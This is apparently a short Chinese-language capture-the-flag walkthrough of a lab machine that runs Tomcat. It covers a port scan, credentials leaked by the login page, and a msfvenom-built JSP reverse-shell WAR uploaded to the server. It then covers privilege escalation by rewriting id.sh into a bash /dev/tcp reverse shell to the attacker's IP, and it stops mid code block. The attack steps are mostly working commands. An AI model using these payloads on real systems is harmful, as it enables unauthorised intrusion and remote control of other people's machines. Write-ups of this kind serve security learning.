
## nmap扫描端口
访问8080端口发现是tomcat 有个登录界面

登录界面点取消键就爆出了账户密码 有点离谱了

有个上传页面 上传一个反弹shell

![image.png](https://s2.loli.net/2025/05/01/5U3YcxeDzRVjMb1.png)

制造反弹shell 用msf连接
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.17.40.203 lport=6666-f war > shell.war
```

![image.png](https://s2.loli.net/2025/05/01/6TZ9pfwiHovnIR3.png)

反弹成功

检查到id.sh可以提权
## 提权
```
cat > id.sh <<EOF
#!/bin/bash
bash -i >& /dev/tcp/10.17.40.203/8888 0>&1
EOF
# 